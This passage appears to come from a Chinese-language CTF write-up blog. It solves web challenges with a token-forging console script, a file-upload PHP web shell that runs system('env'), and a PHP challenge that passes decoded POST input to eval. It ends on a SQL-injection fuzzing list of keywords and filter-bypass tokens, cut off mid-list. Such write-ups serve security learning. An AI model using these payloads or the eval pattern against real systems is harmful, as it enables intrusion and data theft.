src="06a13719738926ca61e99cf9e679fade.png" alt="screen-capture.png"  /><img src="5a690493cdf7649c6cb2e1d6f0a2fc2d.png" alt="screen-capture.png"  /><img src="ccc0ad95a04756d58e622cb11ed28722.png" alt="screen-capture.png"  /><p>F12 åœ¨æ§åˆ¶å°å¯«è…³æœ¬</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> expressionElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;expressionText&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> tokenInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;tokenInput&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> submitButton = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;submitBtn&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> expression = expressionElement.<span class="property">textContent</span>;</span><br><span class="line">    <span class="keyword">const</span> regex = <span class="regexp">/token = \(\d+ \* (\d+)\) \^ (0x[0-9a-fA-F]+|\d+)/</span>;</span><br><span class="line">    <span class="keyword">const</span> match = expression.<span class="title function_">match</span>(regex);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (match &amp;&amp; match.<span class="property">length</span> === <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> multiplier = <span class="title class_">BigInt</span>(match[<span class="number">1</span>]); <span class="comment">// ç›´æ¥è½¬æ¢ä¸º BigInt</span></span><br><span class="line">        <span class="keyword">const</span> xor_value = <span class="title class_">BigInt</span>(match[<span class="number">2</span>]);  <span class="comment">// BigInt æ”¯æŒç›´æ¥è§£æåè¿›åˆ¶æˆ–åå…­è¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> currentTimestamp = <span class="title class_">BigInt</span>(<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Date</span>.<span class="title function_">now</span>() / <span class="number">1000</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// è®¡ç®— token = (å½“å‰æ—¶é—´æˆ³ * multiplier) ^ xor_value</span></span><br><span class="line">        <span class="keyword">const</span> token = (currentTimestamp * multiplier) ^ xor_value;</span><br><span class="line">        </span><br><span class="line">        tokenInput.<span class="property">value</span> = token.<span class="title function_">toString</span>(); <span class="comment">// BigInt ç»“æœè½¬ä¸ºå­—ç¬¦ä¸²å¡«å…¥</span></span><br><span class="line">        submitButton.<span class="title function_">click</span>();                <span class="comment">// æ¨¡æ‹Ÿç‚¹å‡»æäº¤æŒ‰é’®</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;è‡ªåŠ¨åŒ–æµç¨‹å·²æ‰§è¡Œã€‚è®¡ç®—å‡ºçš„ token:&#x27;</span>, token.<span class="title function_">toString</span>());</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;è¯·æ£€æŸ¥ç»“æœã€‚&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><img src="10ab2a9b3a52725bd0212737b4ac2e2e.png" alt="screen-capture.png"  /><h2 id="3-ç™½å¸½å°Kçš„æ•…äº‹ï¼ˆ1ï¼‰"><a href="#3-ç™½å¸½å°Kçš„æ•…äº‹ï¼ˆ1ï¼‰" class="headerlink" title="3.ç™½å¸½å°Kçš„æ•…äº‹ï¼ˆ1ï¼‰"></a>3.ç™½å¸½å°Kçš„æ•…äº‹ï¼ˆ1ï¼‰</h2><img src="a24def4af9039cc05907adb91ef9f74a.png" alt="screen-capture.png"  /><img src="968f69408cec6cd3c808133ed6db371f.png" alt="screen-capture.png"  /><img src="9867d60a770064673ef8afec2748fdc0.png" alt="screen-capture.png"  /><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TODOï¼š</span></span><br><span class="line"><span class="comment">// å°å²¸åŒå­¦åˆ°æ—¶å€™è®°å¾—æŠŠè¿™ä¸ªå‡½æ•°åˆ æ‰</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fetchload</span>(<span class="params">file</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/v1/onload&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            <span class="attr">headers</span>: &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span> &#125;,</span><br><span class="line">            <span class="attr">body</span>: <span class="string">`file=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(file)&#125;</span>`</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">const</span> data = <span class="keyword">await</span> res.<span class="title function_">json</span>();</span><br><span class="line">        <span class="keyword">if</span> (data.<span class="property">success</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;File content:&#x27;</span>, data.<span class="property">success</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error loading file:&#x27;</span>, data.<span class="property">error</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Request failed&#x27;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fetchList</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>dirsearchä¸€ä¸‹ , </p><img src="2cf97f3fe905d6b20a101b500a120b14.png" alt="screen-capture.png"  /><p>æ‡‰è©²æœ‰ä¸€å€‹v1&#x2F;upload ç”¨post æ–¹æ³•çš„ </p><p>Content-Type &#x3D; application&#x2F;x-www-form-urlencoded</p><p>file &#x3D; urlencode(easty.php)</p><img src="74edd55cd8bc89448ea0acc8c3260047.png" alt="screen-capture.png"  /><p>æˆ‘å‰›å‰›ä¸Šå‚³å®Œå¦å¤–ä¸€å€‹æ–‡ä»¶ , æ–‡ä»¶çš„å­—è¢«urlencodeäº†, runä¸äº† , æˆ‘æ‡‰è©²éœ€è¦æ”¹ä¸€æ”¹ä¸€å¥è©±æœ¨é¦¬</p><img src="bd6a97968077d6b535687d558fe8a48b.png" alt="screen-capture.png"  /><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;env&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="7fc3dddba832a685e5f5c2650960bb36.png" alt="screen-capture.png"  /><p>flag{51fe6807-7862-41b3-a4dc-3cd271b02f53}</p><h2 id="4-çœŸçš„æ˜¯ç­¾åˆ°è¯¶"><a href="#4-çœŸçš„æ˜¯ç­¾åˆ°è¯¶" class="headerlink" title="4.çœŸçš„æ˜¯ç­¾åˆ°è¯¶"></a>4.çœŸçš„æ˜¯ç­¾åˆ°è¯¶</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cipher</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cipher&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">atbash</span>(<span class="params"><span class="variable">$text</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">foreach</span> (<span class="title function_ invoke__">str_split</span>(<span class="variable">$text</span>) <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$char</span>)) &#123;</span><br><span class="line">      <span class="variable">$is_upper</span> = <span class="title function_ invoke__">ctype_upper</span>(<span class="variable">$char</span>);</span><br><span class="line">      <span class="variable">$base</span> = <span class="variable">$is_upper</span> ? <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;A&#x27;</span>) : <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">      <span class="variable">$offset</span> = <span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$char</span>)) - <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">      <span class="variable">$new_char</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$base</span> + (<span class="number">25</span> - <span class="variable">$offset</span>));</span><br><span class="line">      <span class="variable">$result</span> .= <span class="variable">$new_char</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable">$result</span> .= <span class="variable">$char</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cipher</span>) &#123;</span><br><span class="line">  <span class="variable">$cipher</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cipher</span>);</span><br><span class="line">  <span class="variable">$encoded</span> = <span class="title function_ invoke__">atbash</span>(<span class="variable">$cipher</span>);</span><br><span class="line">  <span class="variable">$encoded</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$encoded</span>);</span><br><span class="line">  <span class="variable">$encoded</span> = <span class="title function_ invoke__">str_rot13</span>(<span class="variable">$encoded</span>);</span><br><span class="line">  @<span class="keyword">eval</span>(<span class="variable">$encoded</span>);</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$question</span> = <span class="string">&quot;çœŸçš„æ˜¯ç­¾åˆ°å—ï¼Ÿ&quot;</span>;</span><br><span class="line"><span class="variable">$answer</span> = <span class="string">&quot;çœŸçš„å¾ˆç­¾åˆ°è¯¶ï¼&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> =  <span class="variable">$question</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="variable">$answer</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span> . <span class="variable">$res</span> . <span class="variable">$res</span> . <span class="variable">$res</span> . <span class="variable">$res</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> çœŸçš„æ˜¯ç­¾åˆ°å—ï¼Ÿ</span><br><span class="line">çœŸçš„å¾ˆç­¾åˆ°è¯¶ï¼</span><br><span class="line">çœŸçš„æ˜¯ç­¾åˆ°å—ï¼Ÿ</span><br><span class="line">çœŸçš„å¾ˆç­¾åˆ°è¯¶ï¼</span><br><span class="line">çœŸçš„æ˜¯ç­¾åˆ°å—ï¼Ÿ</span><br><span class="line">çœŸçš„å¾ˆç­¾åˆ°è¯¶ï¼</span><br><span class="line">çœŸçš„æ˜¯ç­¾åˆ°å—ï¼Ÿ</span><br><span class="line">çœŸçš„å¾ˆç­¾åˆ°è¯¶ï¼</span><br><span class="line">çœŸçš„æ˜¯ç­¾åˆ°å—ï¼Ÿ</span><br><span class="line">çœŸçš„å¾ˆç­¾åˆ°è¯¶ï¼</span><br></pre></td></tr></table></figure><img src="bdddc5e1d3262eb01c4db46f9439dada.png" alt="screen-capture.png"  /><p>å¤„ç†æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>è·å– POST å‚æ•° cipherã€‚</li><li>å¯¹ $cipher è¿›è¡Œ base64_decode è§£ç ã€‚</li><li>å¯¹è§£ç åçš„å­—ç¬¦ä¸²è¿›è¡Œ atbash å­—æ¯æ›¿æ¢ï¼ˆAtbash å¯†ç ï¼‰ã€‚</li><li>ç§»é™¤ atbash ç»“æœä¸­çš„æ‰€æœ‰ç©ºæ ¼ (str_replace(â€˜ â€˜, â€˜â€™, â€¦))ã€‚</li><li>å¯¹ç§»é™¤ç©ºæ ¼åçš„å­—ç¬¦ä¸²è¿›è¡Œ str_rot13 å­—æ¯æ›¿æ¢ï¼ˆROT13 å¯†ç ï¼‰ã€‚</li><li>å°†æœ€ç»ˆç»“æœå­—ç¬¦ä¸²é€šè¿‡ @eval() æ‰§è¡Œã€‚</li></ol><img src="12228cbb4dbc6f3307d69851f2cc0ca0.png" alt="screen-capture.png"  /><br/><p>é‚„æ˜¯æ²’åæ‡‰??</p><img src="f830254902a0fd4edfa1c9f3c9429270.png" alt="screen-capture.png"  /><p>æœ‰ä¸€å€‹exit; æˆ‘å€‘è¦åœ¨$encodedå¾Œé¢åŠ ä¸€å€‹die;</p><img src="3576f102506a27c694bfcebee2ff641c.png" alt="screen-capture.png"  /><img src="d03e62d59181a1e45e0dc144c4188ada.png" alt="screen-capture.png"  /><p>å¯ä»¥é‹è¡Œäº† , ç”¨$IFS    è¿‡æ»¤ä¸€ä¸‹ </p><img src="5e763e27706e612f30b1516febcfc14a.png" alt="screen-capture.png"  /><img src="1930751f76ba9c39db363536d12229eb.png" alt="screen-capture.png"  /><h2 id="5-å°Eçš„ç®¡ç†ç³»ç»Ÿ-æœªå¤åˆ»"><a href="#5-å°Eçš„ç®¡ç†ç³»ç»Ÿ-æœªå¤åˆ»" class="headerlink" title="5.å°Eçš„ç®¡ç†ç³»ç»Ÿ(æœªå¤åˆ»)"></a>5.å°Eçš„ç®¡ç†ç³»ç»Ÿ(æœªå¤åˆ»)</h2><img src="e8bb870428d9083e8e7cb7f50f1bb5d9.png" alt="e8bb870428d9083e8e7cb7f50f1bb5d9.png"  /><p>idæ˜¯GET </p><p>sqlmapå®Œå…¨æ²’æœ‰ç”¨, çœ‹ä¾†è¦æ‰‹æ³¨äº† ,???</p><img src="77479fa65f747a00423e9eafa77caa01.png" alt="77479fa65f747a00423e9eafa77caa01.png"  /><p>urlç·¨ç¢¼ç¹é ,</p><img src="f1897f60ebf5715c2b0d7e28f2ce827e.png" alt="f1897f60ebf5715c2b0d7e28f2ce827e.png"  /><p>&#x2F;**&#x2F;è¢«banäº†</p><img src="3a53ac7b5466794d95109a0fd6667de7.png" alt="3a53ac7b5466794d95109a0fd6667de7.png"  /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br></pre></td></tr></table></figure><img src="34cb09a8a1cb644de56dae7972bef206.png" alt="34cb09a8a1cb644de56dae7972bef206.png"  /><p>åˆ—åéƒ½è¢«banäº† ((((((</p><p>ç”¨äº†å‡ºé¡Œäººçš„å­—å…¸ </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line">length</span><br><span class="line">Length</span><br><span class="line">+</span><br><span class="line">handler</span><br><span class="line">like</span><br><span class="line">LiKe</span><br><span class="line">select</span><br><span class="line">SeleCT</span><br><span class="line">sleep</span><br><span class="line">SLEEp</span><br><span class="line">database</span><br><span class="line">DATABASe</span><br><span class="line">delete</span><br><span class="line">having</span><br><span class="line">or</span><br><span class="line">oR</span><br><span class="line">as</span><br><span class="line">As</span><br><span class="line">-~</span><br><span class="line">BENCHMARK</span><br><span class="line">limit</span><br><span class="line">LimIt</span><br><span class="line">left</span><br><span class="line">Left</span><br><span class="line">select</span><br><span class="line">SELECT</span><br><span class="line">insert</span><br><span class="line">insERT</span><br><span class="line">INSERT</span><br><span class="line">right</span><br><span class="line">#</span><br><span class="line">--+</span><br><span class="line">INFORMATION</span><br><span class="line">--</span><br><span class="line">;</span><br><span class="line">!</span><br><span class="line">%</span><br><span class="line">+</span><br><span class="line">xor</span><br><span class="line">&lt;&gt;</span><br><span class="line">(</span><br><span class="line">&gt;</span><br><span class="line">&lt;</span><br><span class="line">)</span><br><span class="line">.</span><br><span class="line">^</span><br><span class="line">=</span><br><span class="line">AND</span><br><span class="line">ANd</span><br><span class="line">BY</span><br><span class="line">By</span><br><span class="line">CAST</span><br><span class="line">COLUMN</span><br><span class="line">COlumn</span><br><span class="line">COUNT</span><br><span class="line">Count</span><br><span class="line">CREATE</span><br><span class="line">END</span><br><span class="line">case</span><br><span class="line">&#x27;1&#x27;=&#x27;1</span><br><span class="line">when</span><br><span class="line">admin&#x27;</span><br><span class="line">&quot;</span><br><span class="line">length </span><br><span class="line">+</span><br><span class="line">REVERSE</span><br><span class="line">ascii</span><br><span class="line">ASSIC</span><br><span class="line">ASSic</span><br><span class="line">select </span><br><span class="line">database</span><br><span class="line">left</span><br><span class="line">right</span><br><span class="line">union</span><br><span class="line">UNIon</span><br><span class="line">UNION</span><br><span class="line">&quot;</span><br><span class="line">&#x27;</span><br><span class="line">&amp;</span><br><span class="line">&amp;&amp;</span><br><span class="line">||</span><br><span class="line">oorr</span><br><span class="line">/</span><br><span class="line">//</span><br><span class="line">//*</span><br><span class="line">*/*</span><br><span class="line">/**/</span><br><span class="line">anandd</span><br><span class="line">GROUP</span><br><span class="line">HAVING</span><br><span class="line">IF</span><br><span class="line">INTO</span><br><span class="line">JOIN</span><br><span class="line">LEAVE</span><br><span class="line">LEFT</span><br><span class="line">LEVEL</span><br><span class="line">sleep</span><br><span class="line">LIKE</span><br><span class="line">NAMES</span><br><span class="line">NEXT</span><br><span class="line">NULL</span><br><span class="line">OF</span><br><span class="line">ON</span><br><span class="line">|</span><br><span class="line">infromation_schema</span><br><span class="line">user</span><br><span class="line">OR</span><br><span class="line">ORDER</span><br><span class="line">ORD</span><br><span class="line">SCHEMA</span><br><span class="line">SELECT</span><br><span class="line">SET</span><br><span class="line">TABLE</span><br><span class="line">THEN</span><br><span class="line">UNION</span><br><span class="line">UPDATE</span><br><span class="line">USER</span><br><span class="line">USING</span><br><span class="line">VALUE</span><br><span class="line">VALUES</span><br><span class="line">WHEN</span><br><span class="line">WHERE</span><br><span class="line">ADD</span><br><span class="line">AND</span><br><span class="line">prepare</span><br><span class="line">set</span><br><span class="line">update</span><br><span class="line">delete</span><br><span class="line">drop</span><br><span class="line">inset</span><br><span class="line">CAST</span><br><span class="line">COLUMN</span><br><span class="line">CONCAT</span><br><span class="line">GROUP_CONCAT</span><br><span class="line">group_concat</span><br><span class="line">CREATE</span><br><span class="line">DATABASE</span><br><span class="line">DATABASES</span><br><span class="line">alter</span><br><span class="line">DELETE</span><br><span class="line">DROP</span><br><span class="line">floor</span><br><span class="line">join</span><br><span class="line">rand()</span><br><span class="line">substr(</span><br><span class="line">substring(</span><br><span class="line">mid(</span><br><span class="line">rand(</span><br><span class="line">information_schema.tables</span><br><span class="line">TABLE_SCHEMA</span><br><span class="line">%df</span><br><span class="line">concat_ws()</span><br><span class="line">concat</span><br><span class="line">char(</span><br><span class="line">hex(</span><br><span class="line">ascii(</span><br><span class="line">LIMIT</span><br><span class="line">ORD</span><br><span class="line">ON</span><br><span class="line">extractvalue</span><br><span class="line">order</span><br><span class="line">CAST()</span><br><span class="line">by</span><br><span class="line">ORDER</span><br><span class="line">OUTFILE</span><br><span class="line">RENAME</span><br><span class="line">REPLACE</span><br><span class="line">SCHEMA</span><br><span class="line">SELECT</span><br><span class="line">SET</span><br><span class="line">updatexml</span><br><span class="line">SHOW</span><br><span class="line">SQL</span><br><span class="line">TABLE</span><br><span class="line">THEN</span><br><span class="line">TRUE</span><br><span class="line">instr</span><br><span class="line">benchmark</span><br><span class="line">format</span><br><span class="line">bin</span><br><span class="line">substring</span><br><span class="line">ord</span><br><span class="line">UPDATE</span><br><span class="line">VALUES</span><br><span class="line">VARCHAR</span><br><span class="line">VERSION</span><br><span class="line">WHEN</span><br><span class="line">WHERE</span><br><span class="line">/*</span><br><span class="line">`</span><br><span class="line"> </span><br><span class="line">,</span><br><span class="line">users</span><br><span class="line">%0a</span><br><span class="line">%0A</span><br><span class="line">%0b</span><br><span class="line">mid</span><br><span class="line">for</span><br><span class="line">BEFORE</span><br><span class="line">REGEXP</span><br><span class="line">RLIKE</span><br><span class="line">in</span><br><span class="line">sys schemma</span><br><span class="line">SEPARATOR</span><br><span class="line">XOR</span><br><span class="line">CURSOR</span><br><span class="line">FLOOR</span><br><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">INFILE</span><br><span class="line">count</span><br><span class="line">%0c</span><br><span class="line">from</span><br><span class="line">%0d</span><br><span class="line">%a0</span><br><span class="line">=</span><br><span class="line">@</span><br><span class="line">else</span><br><span class="line">%27</span><br><span class="line">%23</span><br><span class="line">%22</span><br><span class="line">%20</span><br><span class="line">%0a</span><br></pre></td></tr></table></figure><p>200çš„æœ‰:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NULL    </span><br><span class="line">TURE</span><br></pre></td></tr></table></figure><br/><p>500çš„æœ‰:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 